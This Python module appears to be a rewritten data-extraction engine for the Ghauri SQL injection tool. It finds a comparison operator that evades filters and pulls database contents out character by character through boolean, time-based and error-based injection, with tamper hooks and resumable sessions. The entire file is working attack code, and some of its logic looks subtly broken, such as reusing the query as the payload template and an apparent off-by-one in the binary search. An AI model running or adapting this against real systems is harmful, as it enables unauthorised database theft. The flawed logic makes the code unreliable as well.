#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ghauri data extraction module – modernized 2026 edition

Features / changes:
• Python 3.11+ typing & match/case
• Pluggable tamper application points
• Centralized network retry logic
• All four search strategies fully implemented
• Error-based fast-path + blind/time fallback
• Resume support via session db
• Character validation step preserved
• Threaded path kept (but warned against)

Compatibility: should drop-in replace original extract.py
"""

from __future__ import annotations

import enum
import random
import time
from dataclasses import dataclass, field
from functools import partial
from typing import Any, Callable, Literal, NamedTuple, Optional

from ghauri.common.config import conf
from ghauri.common.session import session
from ghauri.logger.colored_logger import logger
from ghauri.core.inject import inject_expression
from ghauri.common.lib import re, collections
from ghauri.common.payloads import (
    NUMBER_OF_CHARACTERS_PAYLOADS,
    LENGTH_PAYLOADS,
    DATA_EXTRACTION_PAYLOADS,
    REGEX_XPATH, REGEX_ERROR_BASED, REGEX_BIGINT_BASED, REGEX_DOUBLE_BASED,
    REGEX_GEOMETRIC_BASED, REGEX_GTID_BASED, REGEX_JSON_KEYS, REGEX_GENERIC,
    REGEX_MSSQL_STRING, REGEX_GENERIC_ERRORS,
)
from ghauri.common.utils import (
    replace_with,
    search_regex,
    check_boolean_responses,
)

# ─── Tamper subsystem placeholder ───────────────────────────────────────────────

class TamperStage(enum.Enum):
    DETECTION = "detection"
    EXTRACTION = "extraction"


@dataclass
class TamperResult:
    payload: str
    applied: list[str] = field(default_factory=list)


def apply_tampers(
    payload: str,
    stage: TamperStage = TamperStage.EXTRACTION,
    context: dict | None = None,
) -> TamperResult:
    """
    Real implementation should live in ghauri.tampers.engine
    For now: identity function + future hook
    """
    # Example: return TamperResult(payload="%27%20AND%201=1--")
    return TamperResult(payload=payload)


# ─── Retry decorator ────────────────────────────────────────────────────────────────

def retry_network(max_attempts: int = 4, base: float = 0.7) -> Callable:
    def decorator(func):
        def wrapper(*a, **kw):
            for attempt in range(1, max_attempts + 1):
                try:
                    return func(*a, **kw)
                except (ConnectionError, TimeoutError, OSError) as exc:
                    if attempt == max_attempts:
                        raise
                    delay = base * (1.8 ** (attempt - 1)) + random.uniform(0, 0.5)
                    logger.debug(f"Retry {attempt}/{max_attempts} after {delay:.1f}s – {exc}")
                    time.sleep(delay)
        return wrapper
    return decorator


retry_request = retry_network()


# ─── Types & Enums ──────────────────────────────────────────────────────────────────

class SearchStrategy(enum.Enum):
    BINARY_GT    = "binary (>)"
    BETWEEN      = "NOT BETWEEN 0 AND"
    IN_OPERATOR  = "IN (...)"
    LINEAR_EQ    = "linear (=)"


@dataclass(frozen=True)
class OperatorProbe:
    strategy: SearchStrategy
    forced: bool = False
    note: str = ""


class CharResult(NamedTuple):
    success: bool = False
    value: str = ""
    strategy: SearchStrategy | None = None
    error: str = ""
    resumed: bool = False


# ─── Main Extractor ─────────────────────────────────────────────────────────────────

class GhauriExtractor:
    def __init__(self):
        self._thread_chars: dict[int, str] = {}

    # ── 1. Probe best comparison operator ───────────────────────────────────────

    @retry_request
    def probe_operator(
        self,
        url: str,
        data: Any,
        vector: str,
        parameter: str,
        headers: dict,
        base_resp: Any,
        injection_type: str,
        proxy: str | None = None,
        is_multipart: bool = False,
        timeout: float = 30.0,
        delay: float = 0.0,
        timesec: float = 5.0,
        attack01: Any = None,
        match_string: str | None = None,
        vector_type: Literal["boolean", "time"] | None = None,
    ) -> OperatorProbe:

        probes = [
            (SearchStrategy.BINARY_GT,   "6590>6420"),
            (SearchStrategy.BETWEEN,     "6590 NOT BETWEEN 0 AND 6420"),
            (SearchStrategy.IN_OPERATOR, "(SELECT 45) IN (10,45,60)"),
            (SearchStrategy.LINEAR_EQ,   "09845=9845"),
        ]

        forced = getattr(conf, "fetch_using", None)
        if forced and forced.lower() in {"binary", "between", "in", "equal"}:
            name_map = {"binary": SearchStrategy.BINARY_GT, "between": SearchStrategy.BETWEEN,
                        "in": SearchStrategy.IN_OPERATOR, "equal": SearchStrategy.LINEAR_EQ}
            strategy = name_map.get(forced.lower())
            if strategy:
                probes = [(strategy, [p[1] for p in probes if p[0] is strategy][0])]

        for strat, inference in probes:
            expr = vector.replace("[INFERENCE]", inference).replace("[SLEEPTIME]", str(timesec))
            tamper = apply_tampers(expr, TamperStage.DETECTION)
            expr = tamper.payload

            attack = inject_expression(
                url=url, data=data, proxy=proxy, delay=delay, timesec=timesec,
                timeout=timeout, headers=headers, parameter=parameter,
                expression=expr, is_multipart=is_multipart,
                injection_type=injection_type,
            )

            vulnerable = False
            if vector_type == "boolean" and attack01:
                res = check_boolean_responses(base_resp, attack, attack01, match_string=match_string)
                vulnerable = res.vulnerable
            elif vector_type == "time":
                vulnerable = attack.response_time >= timesec

            if vulnerable:
                if strat is not SearchStrategy.BINARY_GT and not forced:
                    logger.info(f"Switching to {strat.value} — better WAF compatibility")
                return OperatorProbe(strat, bool(forced))

        raise RuntimeError("All comparison operators appear filtered → extraction impossible")

    # ── 2. Character extraction methods ─────────────────────────────────────────

    @retry_request
    def _char_binary_gt(
        self,
        url: str,
        vector: str,
        parameter: str,
        headers: dict,
        base_resp: Any,
        injection_type: str,
        offset: int,
        queryable: str,
        payload_tpl: str,
        min_ord: int = 32,
        max_ord: int = 127,
        vector_type: str = "boolean",
        attack01: Any = None,
        match_string: str | None = None,
        proxy: str | None = None,
        timeout: float = 30.0,
        delay: float = 0.0,
        timesec: float = 5.0,
        **kwargs,
    ) -> str:
        lo, hi = min_ord, max_ord
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = payload_tpl.format(query=queryable, position=offset, char=mid)
            cond = replace_with(cond, "=", ">")
            expr = vector.replace("[INFERENCE]", cond)
            tamper = apply_tampers(expr, TamperStage.EXTRACTION)
            expr = tamper.payload

            attack = inject_expression(
                url=url, data=None, proxy=proxy, delay=delay, timesec=timesec,
                timeout=timeout, headers=headers, parameter=parameter,
                expression=expr, is_multipart=False, injection_type=injection_type,
            )

            is_true = False
            if vector_type == "boolean" and attack01:
                res = check_boolean_responses(base_resp, attack, attack01, match_string=match_string)
                is_true = res.vulnerable
            elif vector_type == "time":
                is_true = attack.response_time >= timesec

            if is_true:
                lo = mid + 1
            else:
                hi = mid - 1

        ch = chr(lo - 1) if lo > min_ord else ""
        if ch:
            logger.debug(f"pos {offset:2} → {ch!r}")
        return ch

    @retry_request
    def _char_between(
        self,
        url: str,
        vector: str,
        parameter: str,
        headers: dict,
        base_resp: Any,
        injection_type: str,
        offset: int,
        queryable: str,
        payload_tpl: str,
        min_ord: int = 32,
        max_ord: int = 127,
        vector_type: str = "boolean",
        attack01: Any = None,
        match_string: str | None = None,
        proxy: str | None = None,
        timeout: float = 30.0,
        delay: float = 0.0,
        timesec: float = 5.0,
        **kwargs,
    ) -> str:
        lo, hi = min_ord, max_ord
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = payload_tpl.format(query=queryable, position=offset, char=mid)
            cond = replace_with(cond, "=", " NOT BETWEEN 0 AND ")
            expr = vector.replace("[INFERENCE]", cond)
            tamper = apply_tampers(expr, TamperStage.EXTRACTION)
            expr = tamper.payload

            attack = inject_expression(
                url=url, data=None, proxy=proxy, delay=delay, timesec=timesec,
                timeout=timeout, headers=headers, parameter=parameter,
                expression=expr, injection_type=injection_type,
            )

            is_true = False
            if vector_type == "boolean" and attack01:
                res = check_boolean_responses(base_resp, attack, attack01, match_string=match_string)
                is_true = res.vulnerable
            elif vector_type == "time":
                is_true = attack.response_time >= timesec

            if is_true:
                lo = mid + 1
            else:
                hi = mid - 1

        ch = chr(lo - 1) if lo > min_ord else ""
        return ch

    @retry_request
    def _char_in(
        self,
        url: str,
        vector: str,
        parameter: str,
        headers: dict,
        base_resp: Any,
        injection_type: str,
        offset: int,
        queryable: str,
        payload_tpl: str,
        min_ord: int = 32,
        max_ord: int = 127,
        vector_type: str = "boolean",
        attack01: Any = None,
        match_string: str | None = None,
        proxy: str | None = None,
        timeout: float = 30.0,
        delay: float = 0.0,
        timesec: float = 5.0,
        **kwargs,
    ) -> str:
        candidates = list(range(min_ord, max_ord + 1))
        while len(candidates) > 1:
            chunk_size = max(1, len(candidates) // 2)
            chunk = candidates[:chunk_size]
            in_list = ",".join(str(c) for c in chunk)
            cond = payload_tpl.format(query=queryable, position=offset, char=f"({in_list})")
            cond = replace_with(cond, "=", " IN ")
            expr = vector.replace("[INFERENCE]", cond)
            tamper = apply_tampers(expr, TamperStage.EXTRACTION)
            expr = tamper.payload

            attack = inject_expression(
                url=url, data=None, proxy=proxy, delay=delay, timesec=timesec,
                timeout=timeout, headers=headers, parameter=parameter,
                expression=expr, injection_type=injection_type,
            )

            is_true = False
            if vector_type == "boolean" and attack01:
                res = check_boolean_responses(base_resp, attack, attack01, match_string=match_string)
                is_true = res.vulnerable
            elif vector_type == "time":
                is_true = attack.response_time >= timesec

            if is_true:
                candidates = chunk
            else:
                candidates = candidates[chunk_size:]

        return chr(candidates[0]) if candidates else ""

    @retry_request
    def _char_linear(
        self,
        url: str,
        vector: str,
        parameter: str,
        headers: dict,
        base_resp: Any,
        injection_type: str,
        offset: int,
        queryable: str,
        payload_tpl: str,
        char_list: str = " ._-@1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        vector_type: str = "boolean",
        attack01: Any = None,
        match_string: str | None = None,
        proxy: str | None = None,
        timeout: float = 30.0,
        delay: float = 0.0,
        timesec: float = 5.0,
        **kwargs,
    ) -> str:
        for ch in char_list:
            cond = payload_tpl.format(query=queryable, position=offset, char=ord(ch))
            expr = vector.replace("[INFERENCE]", cond)
            tamper = apply_tampers(expr, TamperStage.EXTRACTION)
            expr = tamper.payload

            attack = inject_expression(
                url=url, data=None, proxy=proxy, delay=delay, timesec=timesec,
                timeout=timeout, headers=headers, parameter=parameter,
                expression=expr, injection_type=injection_type,
            )

            is_true = False
            if vector_type == "boolean" and attack01:
                res = check_boolean_responses(base_resp, attack, attack01, match_string=match_string)
                is_true = res.vulnerable
            elif vector_type == "time":
                is_true = attack.response_time >= timesec

            if is_true:
                return ch
        return ""

    # ── 3. Length detection ─────────────────────────────────────────────────────────

    def _get_output_length(
        self,
        url: str,
        data: Any,
        vector: str,
        parameter: str,
        headers: dict,
        base_resp: Any,
        injection_type: str,
        payloads: list[str],
        backend: str,
        proxy: str | None = None,
        timeout: float = 30.0,
        delay: float = 0.0,
        timesec: float = 5.0,
        attack01: Any = None,
        match_string: str | None = None,
        vector_type: str = "boolean",
    ) -> int:
        noc_payloads = NUMBER_OF_CHARACTERS_PAYLOADS.get(backend, [])
        if isinstance(noc_payloads, str):
            noc_payloads = [noc_payloads]

        length_payloads = LENGTH_PAYLOADS.get(backend, [])
        if isinstance(length_payloads, str):
            length_payloads = [length_payloads]

        # Phase 1: number of characters
        working_noc_query = ""
        noc = 0
        for noc_tpl in noc_payloads:
            for q in payloads:
                for pos in range(1, 11):
                    cond = noc_tpl.format(query=q, char=pos)
                    expr = vector.replace("[INFERENCE]", cond).replace("[SLEEPTIME]", str(timesec))
                    tamper = apply_tampers(expr, TamperStage.DETECTION)
                    expr = tamper.payload

                    attack = inject_expression(
                        url=url, data=data, proxy=proxy, delay=delay, timesec=timesec,
                        timeout=timeout, headers=headers, parameter=parameter,
                        expression=expr, injection_type=injection_type,
                    )

                    vulnerable = False
                    if vector_type == "boolean" and attack01:
                        res = check_boolean_responses(base_resp, attack, attack01, match_string=match_string)
                        vulnerable = res.vulnerable
                    elif vector_type == "time":
                        vulnerable = attack.response_time >= timesec

                    if vulnerable:
                        noc = pos
                        working_noc_query = q
                        break
                if noc:
                    break
            if noc:
                break

        if noc == 0:
            return 0

        # Phase 2: actual length
        length_str = ""
        for len_tpl in length_payloads:
            for q in payloads:
                if q != working_noc_query:
                    continue
                pos = 1
                while pos <= noc + 1:
                    ch = self._char_binary_gt(  # length is usually digits → binary is fine
                        url=url, vector=vector, parameter=parameter, headers=headers,
                        base_resp=base_resp, injection_type=injection_type,
                        offset=pos, queryable=q, payload_tpl=len_tpl,
                        min_ord=48, max_ord=57,  # '0'-'9'
                        vector_type=vector_type, attack01=attack01,
                        match_string=match_string, proxy=proxy,
                        timeout=timeout, delay=delay, timesec=timesec,
                    )
                    if not ch:
                        break
                    length_str += ch
                    pos += 1
                if length_str.isdigit():
                    return int(length_str)
        return 0

    # ── 4. Error-based fast path ────────────────────────────────────────────────────

    def _try_error_based(
        self,
        url: str,
        data: Any,
        parameter: str,
        headers: dict,
        injection_type: str,
        payloads: list[str],
        backend: str = "",
        proxy: str | None = None,
        timeout: float = 30.0,
        delay: float = 0.0,
        dump_type: str | None = None,
    ) -> CharResult:
        if "error_vector" not in conf.vectors:
            return CharResult()

        vector = conf.vectors["error_vector"]
        regexes = (
            REGEX_XPATH, REGEX_ERROR_BASED, REGEX_BIGINT_BASED, REGEX_DOUBLE_BASED,
            REGEX_GEOMETRIC_BASED, REGEX_GTID_BASED, REGEX_JSON_KEYS, REGEX_GENERIC,
            REGEX_MSSQL_STRING, REGEX_GENERIC_ERRORS,
        )

        for payload in payloads:
            expr = vector.replace("[INFERENCE]", payload)
            if backend == "Microsoft SQL Server":
                expr = expr.replace("+", "%2b")

            attack = inject_expression(
                url=url, data=data, proxy=proxy, delay=delay, timeout=timeout,
                headers=headers, parameter=parameter, expression=expr,
                injection_type=injection_type,
            )

            text = attack.filtered_text if conf.text_only else attack.text
            value = search_regex(regexes, text, group="error_based_response")

            if value and value != "<blank_value>":
                if dump_type and not conf.fresh_queries:
                    session.upsert(
                        conf.session_filepath,
                        "INSERT OR REPLACE INTO storage (type, value, length) VALUES (?,?,?)",
                        (dump_type, value, len(value))
                    )
                return CharResult(success=True, value=value, resumed=False)

        return CharResult()

    # ── 5. Main public method ───────────────────────────────────────────────────────

    def fetch_characters(
        self,
        url: str,
        data: Any,
        vector: str,
        parameter: str,
        headers: dict,
        base_resp: Any,
        injection_type: str,
        payloads: list[str],
        backend: str = "",
        proxy: str | None = None,
        is_multipart: bool = False,
        timeout: float = 30.0,
        delay: float = 0.0,
        timesec: float = 5.0,
        attack01: Any = None,
        match_string: str | None = None,
        vector_type: Literal["boolean", "time"] | None = None,
        dump_type: str | None = None,
        **kwargs,
    ) -> CharResult:

        # Resume check
        if dump_type and not conf.fresh_queries:
            rows = session.fetchall(
                conf.session_filepath,
                "SELECT value, length FROM storage WHERE type = ?",
                (dump_type,)
            )
            if rows and len(rows[0]["value"]) == rows[0]["length"]:
                logger.progress(f"resumed: {rows[0]['value']}")
                return CharResult(True, rows[0]["value"], resumed=True)

        # Fast path: error-based
        err_res = self._try_error_based(
            url, data, parameter, headers, injection_type, payloads,
            backend=backend, proxy=proxy, timeout=timeout, delay=delay,
            dump_type=dump_type,
        )
        if err_res.success:
            return err_res

        # Slow path: blind / time-based
        length = self._get_output_length(
            url, data, vector, parameter, headers, base_resp, injection_type,
            payloads, backend, proxy, timeout, delay, timesec, attack01,
            match_string, vector_type or "boolean",
        )

        if length <= 0:
            logger.warning("Could not determine output length")
            return CharResult(error="length undetermined")

        probe = self.probe_operator(
            url, data, vector, parameter, headers, base_resp, injection_type,
            proxy=proxy, is_multipart=is_multipart, timeout=timeout, delay=delay,
            timesec=timesec, attack01=attack01, match_string=match_string,
            vector_type=vector_type,
        )

        chars = ""
        start_pos = 1

        # Partial resume
        if dump_type and not conf.fresh_queries:
            rows = session.fetchall(
                conf.session_filepath,
                "SELECT value FROM storage WHERE type = ?",
                (dump_type,)
            )
            if rows:
                chars = rows[0]["value"]
                start_pos = len(chars) + 1

        if conf.threads and vector_type == "boolean":
            logger.warning("Threaded blind extraction is UNSAFE and error-prone — using 1 thread")
            conf.threads = None

        for pos in range(start_pos, length + 1):
            char = ""
            match probe.strategy:
                case SearchStrategy.BINARY_GT:
                    char = self._char_binary_gt(
                        url, vector, parameter, headers, base_resp, injection_type,
                        pos, payloads[0], payloads[0], vector_type=vector_type or "boolean",
                        attack01=attack01, match_string=match_string, proxy=proxy,
                        timeout=timeout, delay=delay, timesec=timesec,
                    )
                case SearchStrategy.BETWEEN:
                    char = self._char_between(
                        url, vector, parameter, headers, base_resp, injection_type,
                        pos, payloads[0], payloads[0], vector_type=vector_type or "boolean",
                        attack01=attack01, match_string=match_string, proxy=proxy,
                        timeout=timeout, delay=delay, timesec=timesec,
                    )
                case SearchStrategy.IN_OPERATOR:
                    char = self._char_in(
                        url, vector, parameter, headers, base_resp, injection_type,
                        pos, payloads[0], payloads[0], vector_type=vector_type or "boolean",
                        attack01=attack01, match_string=match_string, proxy=proxy,
                        timeout=timeout, delay=delay, timesec=timesec,
                    )
                case SearchStrategy.LINEAR_EQ:
                    char = self._char_linear(
                        url, vector, parameter, headers, base_resp, injection_type,
                        pos, payloads[0], payloads[0], vector_type=vector_type or "boolean",
                        attack01=attack01, match_string=match_string, proxy=proxy,
                        timeout=timeout, delay=delay, timesec=timesec,
                    )

            if not char:
                logger.warning(f"Failed to extract character at position {pos}")
                break

            chars += char
            logger.progress(f"retrieved: {chars}")

            if dump_type and not conf.fresh_queries:
                session.upsert(
                    conf.session_filepath,
                    "INSERT OR REPLACE INTO storage (type, value, length) VALUES (?,?,?)",
                    (dump_type, chars, length)
                )

        success = len(chars) == length
        return CharResult(
            success=success,
            value=chars,
            strategy=probe.strategy,
            error="" if success else "incomplete",
            resumed=False
        )


# Singleton (backward compatible)
ghauri_extractor = GhauriExtractor() 
